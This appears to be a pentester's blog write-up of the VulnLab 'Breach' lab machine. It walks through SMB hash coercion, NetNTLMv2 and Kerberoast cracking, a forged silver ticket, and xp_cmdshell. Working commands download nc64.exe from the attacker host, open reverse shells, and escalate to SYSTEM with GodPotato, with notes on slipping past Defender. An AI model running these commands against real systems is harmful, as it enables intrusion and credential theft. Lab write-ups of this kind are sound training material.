+      Kerberoasting
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#silver-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Silver ticket
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      References
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+  <div class="md-content md-content--post" data-md-component="content">
+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href="../../../index.html" class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+              <div class="md-post__authors md-typeset">
+                
+                  <div class="md-profile md-post__profile">
+                    <span class="md-author md-author--long">
+                      <img src="https://avatars.githubusercontent.com/u/108031577?v=4" alt="Tom Fieber">
+                    </span>
+                    <span class="md-profile__description">
+                      <strong>
+                        
+                          <a href="https://tomfieber.github.io">Tom Fieber</a>
+                        
+                      </strong>
+                      <br>
+                      Dad, husband, okay pentester
+                    </span>
+                  </div>
+                
+              </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
+                        <time datetime="2024-06-22 00:00:00+00:00" class="md-ellipsis">June 22, 2024</time>
+                      </div>
+                    </li>
+                    
+                    
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 3v15h3V3zm3 2 4 13 3-1-4-13zM5 5v13h3V5zM3 19v2h18v-2z"/></svg>
+                          <span class="md-ellipsis">
+                            in
+                            
+                              <a href="../../../category/writeups.html">writeups</a>, 
+                              <a href="../../../category/vulnlab.html">vulnlab</a></span>
+                        </div>
+                      </li>
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
+                          <span class="md-ellipsis">
+                            
+                              11 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+            
+          </nav>
+          
+        </div>
+      </div>
+    </div>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+        <span class="md-tag">kerberoasting</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">privilege-abuse</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">silverticket</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">smb</span>
+      
+    
+  </nav>
+
+
+  
+  
+
+
+<h1 id="vulnlab-breach">VulnLab: Breach<a class="headerlink" href="#vulnlab-breach" title="Permanent link">&para;</a></h1>
+<p>Breach is a <strong>MEDIUM</strong> difficulty machine on <a href="https://wiki.vulnlab.com/guidance/medium/breach">VulnLab</a>. This machine involved abusing anonymous access to an SMB share to upload a URL link file to a specific directory to induce an authentication request from a user and cracking the resulting NetNTLMv2 hash. Using those credentials, we can kerberoast a service account and crack the krb5tgs hash to recover the password of the service, and then use that password to create a silver ticket impersonating the local administrator of the box. With that, we abuse the <code>xp_cmdshell</code> functionality on an MS-SQL service to get a shell on the box and capture the first flag. Finally, we can abuse the <code>SeImpersonatePrivilege</code> to escalate to SYSTEM and get the final flag.</p>
+<!-- more -->
+<p><a class="glightbox" href="../../../images/vulnlab_breach/breach.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../images/vulnlab_breach/breach.png" /></a></p>
+<h2 id="walkthrough">Walkthrough<a class="headerlink" href="#walkthrough" title="Permanent link">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
+<p>The nmap scan seems fairly normal; I don't see any really weird ports or anything that really stands out to begin with.</p>
+<div class="highlight"><pre><span></span><code>10.10.106.145:53
+10.10.106.145:80
+10.10.106.145:88
+10.10.106.145:135
+10.10.106.145:139
+10.10.106.145:389
+10.10.106.145:445
+10.10.106.145:464
+10.10.106.145:593
+10.10.106.145:636
+10.10.106.145:1433
+10.10.106.145:3268
+10.10.106.145:3269
+10.10.106.145:3389
+10.10.106.145:5985
+10.10.106.145:9389
+10.10.106.145:49664
+10.10.106.145:49667
+10.10.106.145:49669
+10.10.106.145:61306
+10.10.106.145:62194
+10.10.106.145:62416
+</code></pre></div>
+<h3 id="service-enumeration">Service Enumeration<a class="headerlink" href="#service-enumeration" title="Permanent link">&para;</a></h3>
+<h4 id="smb">SMB<a class="headerlink" href="#smb" title="Permanent link">&para;</a></h4>
+<p>We can run a quick scan with <code>NetExec</code> just to get the domain and computer name.</p>
+<div class="highlight"><pre><span></span><code>〉nxc smb $ip
+SMB         10.10.106.145   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
+</code></pre></div>
+<p>We don't have any luck with a null session, but we do have anonymous (Guest) access to a few of the network shares. </p>
+<div class="highlight"><pre><span></span><code>〉nxc smb $ip -u &#39;anonymous&#39; -p &#39;&#39; --shares
+SMB         10.10.106.145   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
+SMB         10.10.106.145   445    BREACHDC         [+] breach.vl\anonymous: (Guest)
+SMB         10.10.106.145   445    BREACHDC         [*] Enumerated shares
+SMB         10.10.106.145   445    BREACHDC         Share           Permissions     Remark
+SMB         10.10.106.145   445    BREACHDC         -----           -----------     ------
+SMB         10.10.106.145   445    BREACHDC         ADMIN$                          Remote Admin
+SMB         10.10.106.145   445    BREACHDC         C$                              Default share
+SMB         10.10.106.145   445    BREACHDC         IPC$            READ            Remote IPC
+SMB         10.10.106.145   445    BREACHDC         NETLOGON                        Logon server share
+SMB         10.10.106.145   445    BREACHDC         share           READ,WRITE
+SMB         10.10.106.145   445    BREACHDC         SYSVOL                          Logon server share
+SMB         10.10.106.145   445    BREACHDC         Users           READ
+</code></pre></div>
+<p>It probably wasn't SUPER necessary for this box, but since we can read the <code>IPC$</code> share, we can grab a list of users using <code>--rid-brute</code> with <code>netexec</code>. </p>
+<div class="highlight"><pre><span></span><code>〉nxc smb $ip -u &#39;anonymous&#39; -p &#39;&#39; --rid-brute
+SMB         10.10.106.145   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
+SMB         10.10.106.145   445    BREACHDC         [+] breach.vl\anonymous: (Guest)
+SMB         10.10.106.145   445    BREACHDC         498: BREACH\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.106.145   445    BREACHDC         500: BREACH\Administrator (SidTypeUser)
+SMB         10.10.106.145   445    BREACHDC         501: BREACH\Guest (SidTypeUser)
+
+[...SNIP...]
+
+SMB         10.10.106.145   445    BREACHDC         1105: BREACH\Claire.Pope (SidTypeUser)
+SMB         10.10.106.145   445    BREACHDC         1106: BREACH\Julia.Wong (SidTypeUser)
+SMB         10.10.106.145   445    BREACHDC         1107: BREACH\Hilary.Reed (SidTypeUser)
+SMB         10.10.106.145   445    BREACHDC         1108: BREACH\Diana.Pope (SidTypeUser)
+SMB         10.10.106.145   445    BREACHDC         1109: BREACH\Jasmine.Price (SidTypeUser)
+SMB         10.10.106.145   445    BREACHDC         1110: BREACH\George.Williams (SidTypeUser)
+SMB         10.10.106.145   445    BREACHDC         1111: BREACH\Lawrence.Kaur (SidTypeUser)
+SMB         10.10.106.145   445    BREACHDC         1112: BREACH\Jasmine.Slater (SidTypeUser)
+SMB         10.10.106.145   445    BREACHDC         1113: BREACH\Hugh.Watts (SidTypeUser)
+SMB         10.10.106.145   445    BREACHDC         1114: BREACH\Christine.Bruce (SidTypeUser)
+SMB         10.10.106.145   445    BREACHDC         1115: BREACH\svc_mssql (SidTypeUser)
+</code></pre></div>
+<p>Whittling that down a bit we get this list. We can set this aside for now...SPOILER -- we don't really need it.</p>
+<div class="highlight"><pre><span></span><code>BREACH\Administrator
+BREACH\Guest
+BREACH\krbtgt
+BREACH\BREACHDC$
+BREACH\Claire.Pope
+BREACH\Julia.Wong
+BREACH\Hilary.Reed
+BREACH\Diana.Pope
+BREACH\Jasmine.Price
+BREACH\George.Williams
+BREACH\Lawrence.Kaur
+BREACH\Jasmine.Slater
+BREACH\Hugh.Watts
+BREACH\Christine.Bruce
+BREACH\svc_mssql
+</code></pre></div>
+<p>Going back to the list of shares, Checking out the <code>transfer</code> directory within the <code>share</code> share, we find three user folders. Unfortunately, we don't have anonymous access to any of them. </p>
+<div class="highlight"><pre><span></span><code># cd transfer
+# ls
+drw-rw-rw-          0  Thu Feb 17 08:00:35 2022 .
+drw-rw-rw-          0  Fri Jun 21 13:54:30 2024 ..
+drw-rw-rw-          0  Thu Feb 17 05:23:51 2022 claire.pope
+drw-rw-rw-          0  Thu Feb 17 05:23:22 2022 diana.pope
+drw-rw-rw-          0  Thu Feb 17 05:24:39 2022 julia.wong
+</code></pre></div>
+<p>To abuse our write privileges on the <code>share</code> share, we can create the following file and name it something like <code>@secret.url</code>.</p>
+<div class="highlight"><pre><span></span><code>[InternetShortcut]
+URL=anyurl
+WorkingDirectory=anydir
+IconFile=\\10.8.2.86\%USERNAME%.icon
+IconIndex=1
+</code></pre></div>
+<p>After putting that link file in the <code>transfer</code> directory we get an authentication request right away from <code>julia.wong</code>.</p>
+<div class="highlight"><pre><span></span><code>[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.106.145
+[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
+[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:2f03fd15fd6a6f41:B28F8E9168F54C71EE0F1F2438548FC3:0101000000000000004587D6E4C3DA01AD59DFF6B7CFFCBA0000000002000800520042003500450001001E00570049004E002D00540039004B0059004400440049005900490059004D0004003400570049004E002D00540039004B0059004400440049005900490059004D002E0052004200350045002E004C004F00430041004C000300140052004200350045002E004C004F00430041004C000500140052004200350045002E004C004F00430041004C0007000800004587D6E4C3DA0106000400020000000800300030000000000000000100000000200000C618B0A90271E5BE5B10EB3CFE6C7F63D0A6A1DCDEB9C7C3B40E9F26C5A2CBCC0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0032002E00380036000000000000000000
+</code></pre></div>
+<h3 id="foothold">Foothold<a class="headerlink" href="#foothold" title="Permanent link">&para;</a></h3>
+<p>We've got a hash -- let's see if it will crack</p>
+<div class="highlight"><pre><span></span><code>Julia.Wong::BREACH:2f03fd15fd6a6f41:B28F8E9168F54C71EE0F1F2438548FC3:0101000000000000004587D6E4C3DA01AD59DFF6B7CFFCBA0000000002000800520042003500450001001E00570049004E002D00540039004B0059004400440049005900490059004D0004003400570049004E002D00540039004B0059004400440049005900490059004D002E0052004200350045002E004C004F00430041004C000300140052004200350045002E004C004F00430041004C000500140052004200350045002E004C004F00430041004C0007000800004587D6E4C3DA0106000400020000000800300030000000000000000100000000200000C618B0A90271E5BE5B10EB3CFE6C7F63D0A6A1DCDEB9C7C3B40E9F26C5A2CBCC0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0032002E00380036000000000000000000
+</code></pre></div>
+<p>The hash cracked almost immediately using JohnTheRipper.</p>
+<div class="highlight"><pre><span></span><code>〉john --wordlist=/usr/share/wordlists/rockyou.txt julia.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 8 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+Computer1        (Julia.Wong)
+1g 0:00:00:00 DONE (2024-06-21 14:58) 4.761g/s 585142p/s 585142c/s 558545C/s bratz1234..monforte
+Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div>
+<p>We can get the local.txt flag from within the <code>\share\transfer\julia.wong</code> folder. </p>
+<div class="highlight"><pre><span></span><code># cd ../transfer
+
+# ls
+drw-rw-rw-          0  Fri Jun 21 14:55:39 2024 .
+drw-rw-rw-          0  Fri Jun 21 15:13:28 2024 ..
+-rw-rw-rw-        103  Fri Jun 21 14:55:40 2024 @secret.url
+drw-rw-rw-          0  Thu Feb 17 05:23:51 2022 claire.pope
+drw-rw-rw-          0  Thu Feb 17 05:23:22 2022 diana.pope
+drw-rw-rw-          0  Thu Feb 17 05:24:39 2022 julia.wong
+
+# cd julia.wong
+
+# ls
+drw-rw-rw-          0  Thu Feb 17 05:24:39 2022 .
+drw-rw-rw-          0  Fri Jun 21 14:55:39 2024 ..
+-rw-rw-rw-         36  Thu Feb 17 05:25:02 2022 local.txt
+
+# cat local.txt
+VL{****************}
+</code></pre></div>
+<p>We can confirm that the password works using <code>netexec</code>.</p>
+<div class="highlight"><pre><span></span><code>〉nxc smb $ip -u &#39;julia.wong&#39; -p &#39;Computer1&#39;
+SMB         10.10.106.145   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
+SMB         10.10.106.145   445    BREACHDC         [+] breach.vl\julia.wong:Computer1
+</code></pre></div>
+<p>Unfortunately, logging into the machine via WinRM and RDP did not work here. However, after poking around a bit, we can see two ways to move to the next step: Kerberoasting and "stealing" a hash from the MSSQL service.</p>
+<h4 id="stealing-the-hash">Stealing the hash<a class="headerlink" href="#stealing-the-hash" title="Permanent link">&para;</a></h4>
+<p>We're able to access the MSSQL service on the machine using the <code>julia.wong</code> credentials. Unfortunately, that user is not able to impersonate any other users and does not have permissions to enable <code>xp_cmdshell</code>. There's also not really any interesting information stored in the database. However, the <code>xp_dirtree</code> method <strong>IS</strong> enabled in MSSQL, so we can use that to trigger an authentication request to our machine by giving the <code>xp_dirtree</code> method the UNC path for our machine, as follows:</p>
+<div class="highlight"><pre><span></span><code>SQL (BREACH\Julia.Wong  guest@master)&gt; xp_dirtree \\10.8.2.86\share
+subdirectory   depth   file
+------------   -----   ----
+</code></pre></div>
+<p>After running that, we get a NetNTLMv2 hash from the <code>svc_mssql</code> user. </p>
+<div class="highlight"><pre><span></span><code>[SMB] NTLMv2-SSP Client   : 10.10.106.145
+[SMB] NTLMv2-SSP Username : BREACH\svc_mssql
+[SMB] NTLMv2-SSP Hash     : svc_mssql::BREACH:b57510dba0e54bb6:99154DA56D398E95285417022BADC33B:010100000000000000E43590ECC3DA018EC09BDAB9FB81700000000002000800330045004700320001001E00570049004E002D005000340046004D004A0032004E00570042004500370004003400570049004E002D005000340046004D004A0032004E0057004200450037002E0033004500470032002E004C004F00430041004C000300140033004500470032002E004C004F00430041004C000500140033004500470032002E004C004F00430041004C000700080000E43590ECC3DA0106000400020000000800300030000000000000000000000000300000C618B0A90271E5BE5B10EB3CFE6C7F63D0A6A1DCDEB9C7C3B40E9F26C5A2CBCC0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0032002E00380036000000000000000000
+</code></pre></div>
+<p>That also cracked quickly.</p>
+<div class="highlight"><pre><span></span><code>〉john --wordlist=/usr/share/wordlists/rockyou.txt svc_mssql.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 8 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+Trustno1         (svc_mssql)
+1g 0:00:00:00 DONE (2024-06-21 15:08) 10.00g/s 532480p/s 532480c/s 532480C/s truckin..spook
+Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div>
+<p>Unfortunately, even when accessing the MSSQL service as the <code>svc_mssql</code> user, we are still not able to enable the <code>xp_cmdshell</code> method. </p>
+<h4 id="kerberoasting">Kerberoasting<a class="headerlink" href="#kerberoasting" title="Permanent link">&para;</a></h4>
+<p>The other, and probably the intended way, to move forward is by Kerberoasting accounts with a Service Principal Name (SPN) configured...basically user accounts configured to run a service. We can do this from Linux using <code>GetUserSPNs.py</code>. </p>
+<div class="highlight"><pre><span></span><code>〉GetUserSPNs.py -dc-ip $ip -usersfile users.txt breach.vl/julia.wong:Computer1 -request
+
+[...SNIP...]
+
+$krb5tgs$23$*svc_mssql$BREACH.VL$svc_mssql*$4a09f433107440b8e60966bbc298712a$4ca88e23438989cd4cf9ce8a48ee449e47157f2ea639377b5a7acc85f36279cfe78077a6a024ab7af9c9cd43140ea79bf531aacb2977b9ff301051709626bea486fd469962a4d8415511f62eda96f5a3778c742c2f7c191c5d606376f807daa317206920a720fa8193387f6ae96e59cea2ecd5477e851e7709d0177b7e62751e9feb763257cc7cd4304ac7489d13ddd442ad738ab5b93f28690f6f163f8bf570058423c9ed2f6d3c4442f04585214bb7a4a9b8d1f8bd4fba4911f113df27e7b17e19b7e820af092069bb570a47811c6979cfb2d00615776883276e7f6373830ce62eb69dc0c560198692a2c2d0687d6435f5b7aa29bb4021ca76c482ff34bde986c0e31c27a2cd08c491172ffac7480bc4e86f76f3707aceefb485f097d48c36164ae65a400cbfb88c409f1b0b8384c177a88c1eb5527ca6a2ddf1adce8090860e4b7e02362f5f6ebdccfb023e4831541378977535d1a56831a4bbd70c5e5f04af5f1c37aca5e330a1dd11b06a6bfb4e71d1759effee6f486c6b3d06daaeaafac657ea41fdeb9b41a97ecba231c4635bd6a18ef560edc9fb5cf2e2a22007ed3c2f083a51da2e9120dc0649925676af8229bba2dee75ccf4e28513889ec98b8fff8afd31a465b68f20c2fdeda592cb6d18de49f05f6e552c4af74c05b027b1ee59088619764ffd226b3516d33371ca4ca879f543e8d475bc52197a9d102bc1d272afc4f2e9d31c8d033c48011060d4bdb776c68f9d2296fbb0d8dde6787a152a30ffbf690c877e5b17c98c16e6fc29b0433adac2dd5df39554986da366dc6ccc883ddfad9cfef58c9b651971ed496ee1d81e129e122fbcc945957fc092f118913cf032dc00115f7c5527eab70df747e7b89de0b5a7829e1ce355dc81f1f7ec98ed4f493be485232bb692ce77b9cf568a0d107451786375aa534ef23c48ac2d2d6601ba9f3b550eb213a0cc9e782dd657936a30ce6370849b0fd3b2488f9e446d9c5e09b67bca52fb5f4130c07dc8d4b4b06631ae480db174d295583cd9e88987161d4f10ce82c24da4e73cfac369040dd7c51a694d4007d42ddbd37dba266cd43ba0cc0fa7775b45487fa69f676b6b76193f29db714e3f1ee08e49c974ea14487165d05d7ba62352026ac01a9eacb52015a0e79450ee32074967a30d657640d765fcc920a85f2a0e545149c7acb1eed4c067cb3264500d7e1a8a0d0718be23900b99ddf82dd3451d3b535a794e2e3061d5494e3f3dc7169a7ba4e135e1c2a87bc84b4ce1543d0425d07b7f70a0fe73debf3428d5adb9be20cc01ee0a00cfc4684a5e0051351f3530e10f417fff0218541bbda5b7a0ede1983bc8367cde265deff1017ecf361c862bde610064d3f586042d41ae9a3e704b3c12c0870b2e64dabb232e76f67bcd1ba3762a3cb4a92037817724f8f12f013816831d51b0ef459a696d1d093c2915ad4d0504cad7de9f2452ccbf03cd9
+</code></pre></div>
+<p>We can also crack the krb5tgs hash to recover the password for the <code>svc_mssql</code> user.</p>
+<h4 id="silver-ticket">Silver ticket<a class="headerlink" href="#silver-ticket" title="Permanent link">&para;</a></h4>
+<p>In order to create a silver ticket, we need the NT hash of the <code>svc_mssql</code> user...not a plaintext password. We can generate an NT using <code>iconv</code> and <code>openssl</code>. </p>
+<div class="highlight"><pre><span></span><code>〉iconv -f ASCII -t UTF-16LE &lt;(printf &quot;Trustno1&quot;) | openssl dgst -md4
+MD4(stdin)= 69596c7aa1e8daee17f8e78870e25a5c
+</code></pre></div>
+<p>Now we also need the domain SID, which we can get using <code>lookupsid.py</code> from the Impacket suite.</p>
+<div class="highlight"><pre><span></span><code>〉lookupsid.py breach.vl/svc_mssql:Trustno1@$ip
+Impacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra
+
+[*] Brute forcing SIDs at 10.10.106.145
+[*] StringBinding ncacn_np:10.10.106.145[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-2330692793-3312915120-706255856
+
+[...SNIP...]
+</code></pre></div>
+<p>With those two items, we can create the silver ticket with <code>ticketer.py</code>, giving us the ability to access the MSSQL service on the DC as the local administrator. By default, the local administrator is a system administrator in MSSQL server, so hopefully we should be able to enable <code>xp_cmdshell</code> and get command execution now.</p>
+<div class="highlight"><pre><span></span><code>〉ticketer.py -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn MSSQLsvc/breachdc.breach.vl:1433 Administrator
+Impacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for breach.vl/Administrator
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+</code></pre></div>
+<p>In order to be able to use the <code>Administrator.ccache</code> file, we need to set that as the value for the <code>KRB5CCNAME</code> environment variable, using:</p>
+<div class="highlight"><pre><span></span><code>export KRB5CCNAME=Administrator.ccache
+</code></pre></div>
+<p>Now we can access the MSSQL service using the credential cache file. Note the <code>-k</code> and <code>-no-pass</code> arguments here. We're telling <code>mssqlclient.py</code> to use Kerberos authentication and to not prompt us for a password. </p>
+<div class="highlight"><pre><span></span><code>〉mssqlclient.py -dc-ip $ip -k -no-pass Administrator@breachdc.breach.vl
+Impacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to &#39;master&#39;.
+[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
+[!] Press help for extra shell commands
+SQL (BREACH\Administrator  dbo@master)&gt; 
+</code></pre></div>
+<p>Perfect! We're able to enable <code>xp_cmdshell</code> using the following command from within <code>mssqlclient.py</code>:</p>
+<div class="highlight"><pre><span></span><code>enable_xp_cmdshell
+</code></pre></div>
+<p>If you connected using a different tool, refer to the documentation for how to enable <code>xp_cmdshell</code>. </p>
+<p>Now we need to get something on the machine that we can use to get a shell. There is AV on this machine, so some tools may get blocked. If you have time or just want an extra challenge, you can research developing your own custom tooling for this, but since I was doing this box during a hackathon day at work, I just used nc64.exe since I knew (or at least I thought) that id did not get flagged by Defender. We can use the following command to get <code>nc64.exe</code> onto the machine.</p>
+<div class="highlight"><pre><span></span><code>SQL (BREACH\Administrator  dbo@master)&gt; xp_cmdshell powershell -c iwr http://10.8.2.86:8000/nc64.exe -outfile c:\windows\tasks\nc64.exe
+output
+------
+NULL
+</code></pre></div>
+<p>And then run it. </p>
+<div class="highlight"><pre><span></span><code>SQL (BREACH\Administrator  dbo@master)&gt; xp_cmdshell c:\windows\tasks\nc64.exe 10.8.2.86 9001 -e cmd.exe
+</code></pre></div>
+<p>After running that, we do get a connection back and have an interactive shell as the <code>svc_mssql</code> user. </p>
+<div class="highlight"><pre><span></span><code>〉rlwrap -cAr nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.8.2.86] from (UNKNOWN) [10.10.106.145] 51494
+Microsoft Windows [Version 10.0.20348.558]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name        SID
+================ =============================================
+breach\svc_mssql S-1-5-21-2330692793-3312915120-706255856-1115
+
+
+[...SNIP...]
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</code></pre></div>
+<h3 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h3>
+<p>Note that the <code>svc_mssql</code> user has <code>SeImpersonatePrivilege</code> enabled. This is another exercise of getting something past defender. Ultimately, I used <code>GodPotato</code> to abuse the <code>SeImpersonatePrivilege</code>. Please note that I renamed the executable to <code>god.exe</code> from what it originally was. </p>
+<div class="highlight"><pre><span></span><code>C:\Windows\Tasks&gt;.\god.exe -cmd &quot;c:\windows\tasks\nc64.exe 10.8.2.86 9002 -e cmd.exe&quot;
+.\god.exe -cmd &quot;c:\windows\tasks\nc64.exe 10.8.2.86 9002 -e cmd.exe&quot;
+[*] CombaseModule: 0x140733742317568
+[*] DispatchTable: 0x140733744908152
+[*] UseProtseqFunction: 0x140733744200496
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\c887be9a-4a1a-4d98-89f9-7df3afae38c3\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00009002-120c-ffff-9d52-59f5a25d719f
+[*] DCOM obj OXID: 0xdccf82478ef3ca4f
+[*] DCOM obj OID: 0xfe77745c6ce234f9
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 1020 Token:0x744  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 740
+</code></pre></div>
+<p>After running <code>GodPotato</code>, we get another connection back to our machine as <code>nt authority\system</code>. </p>
+<p><a class="glightbox" href="../../../images/screenshots/Pasted%20image%2020240621164514.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../images/screenshots/Pasted%20image%2020240621164514.png" /></a></p>
+<p>Now we can grab the root flag and finish the box! </p>
+<div class="highlight"><pre><span></span><code>C:\Windows\Tasks&gt;cd C:\users\administrator\desktop
+cd C:\users\administrator\desktop
+
+C:\Users\Administrator\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is B465-02B6
+
+ Directory of C:\Users\Administrator\Desktop
+
+02/17/2022  10:51 AM    &lt;DIR&gt;          .
+02/17/2022  09:35 AM    &lt;DIR&gt;          ..
+02/17/2022  10:52 AM                36 root.txt
+               1 File(s)             36 bytes
+               2 Dir(s)  11,743,375,360 bytes free
+</code></pre></div>
+<hr />
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<p><a href="https://github.com/BeichenDream/GodPotato">GodPotato</a></p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+
+
+  
+
+
+  <form class="md-feedback" name="feedback" hidden>
+    <fieldset>
+      <legend class="md-feedback__title">
+        Was this page helpful?
+      </legend>
+      <div class="md-feedback__inner">
+        <div class="md-feedback__list">
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page was helpful" data-md-value="1">
